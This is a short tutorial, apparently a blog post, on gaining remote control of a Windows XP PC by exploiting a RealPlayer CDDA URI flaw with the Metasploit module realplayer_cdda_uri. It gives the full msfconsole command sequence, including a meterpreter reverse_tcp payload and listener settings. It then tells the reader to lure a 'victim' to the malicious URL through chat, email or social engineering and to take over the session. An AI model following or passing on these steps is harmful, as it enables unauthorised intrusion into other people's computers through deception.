How to Get Access of Remote PC through Real Player

This module exploits an initialization flaw within RealPlayer 11/11.1 and RealPlayer SP 1.0 – 1.1.4. An abnormally long CDDA URI causes an object initialization failure. However, this failure is improperly handled and uninitialized memory executed.
Windows XP service pack 2
Windows XP service pack 3
RealPlayer 11 to 11.1
RealPlayer SP 1.0 to 1.1.4
RealPlayer SP 1.1
Internet Explorer 5 .6
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/browser/realplayer_cdda_uri
Msf exploit (realplayer_cdda_uri)>set payload windows/meterpreter/reverse_tcp
Msf exploit (realplayer_cdda_uri)>set lhost 192.168.1.3 (IP of Local Host)
Msf exploit (realplayer_cdda_uri)>set srvhost 192.168.1.3 (This must be an address on the local machine)
Msf exploit (realplayer_cdda_uri)>set uripath realplayer (The Url to use for this exploit)
Msf exploit (realplayer_cdda_uri)>exploit

Now an URL you should give to your victim http://192.168.1.3:8080/realplayer

Send the link of the server to the victim via chat or email or any social engineering technique.
Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“
